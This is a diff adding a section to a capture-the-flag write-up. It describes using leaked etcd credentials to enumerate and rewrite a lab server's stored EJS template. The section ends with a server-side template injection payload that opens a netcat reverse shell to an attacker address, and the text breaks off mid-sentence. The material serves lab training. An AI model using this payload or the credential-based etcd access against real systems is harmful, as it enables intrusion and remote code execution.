@@ -41,5 +41,73 @@ Testing to see if our instance is also vulnerable.
 Using this vulnerability we care able to view leaked credetials for authenticating to `etcd`.
 ![Leaked Creds](https://raw.githubusercontent.com/theMcSam/echoCTF-writeups/refs/heads/main/etceterad/images/leaked_creds_from_etctd_vuln.png)
 
+To be able to hack `etcd` we must first understand what it is. `etcd` is a distributed key-value store used to store configuration data and coordinate distributed systems. Effectively, `etcd` acts as a database where clients can query data from the server in a distributed environment.
 
+We can interract with `etcd` buy using the client software called `etcdctl`.
+First of all we will have to install the tool if it's not available on current attack machine.
 
+After installing it we can now interact with the `etcd`.
+We first send a query to get information about out current user.
+
+```
+mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 user get nodejs
+User: nodejs
+Roles: etsctf
+```
+
+From the above query we can see that we have the role `etsctf`. Now we try to see what permissions are available for this role and what we can achieve with it.
+```
+mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 role get etsctf
+
+Role etsctf
+KV Read:
+	[/home/, /home0) (prefix /home/)
+	[/nodejs/, /nodejs0) (prefix /nodejs/)
+	ETSCTF
+KV Write:
+	[/home/, /home0) (prefix /home/)
+	[/nodejs/, /nodejs0) (prefix /nodejs/)
+```
+
+From the above results users with the role `etsctf` can read and write to the `/home` and `/nodejs` prefixes.
+
+We will attempt to view the keys under the `/nodejs` prefix.
+```
+mcsam@0x32:~/$ ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 get --prefix "/nodejs/" --keys-only
+/nodejs/index
+```
+
+Viewing the value stored in the "/nodejs/index" key.
+```
+ETCDCTL_API=3 etcdctl --user nodejs:sjedon --endpoints http://10.0.160.122:2379 get --prefix "/nodejs/index"
+
+/nodejs/index
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <title><% if (typeof title == "undefined") { %>
+      EtceteraD
+      <% } else { %>
+      <%= title %>
+      <% }%></title>
+      ...
+      </body>
+</html>
+```
+
+From the content of the `/nodejs/index` key we observe and find out that it is the source code for the web site we saw earlier running on port `1337`. Furthermore, we can also see that the source code does some server side rendering and hence may be vulnerable to SSTI. From our initial Nmap scan, nmap reported that the service running on port `1337` was powered by Node.js (Express middleware). This can guide us to know the kind of code to execute inorder to obtain RCE.
+
+Testing our theory.
+Since we have write access to `/nodejs/index` key we will write our own content to verify if we can obtain code exeuction. Payload: `Bingo: <%= 7*7 %>`
+```
+
+```
+
+After a number of google searches we find a payload that can help us execute code on the target. We can leverage this to spawn a reverse shell on the target.
+`<%= process.mainModule.require('child_process').execSync('nc 10.10.1.126 8989 -e /bin/bash') %>`
+
+To be able to obtain code execution we will have to write
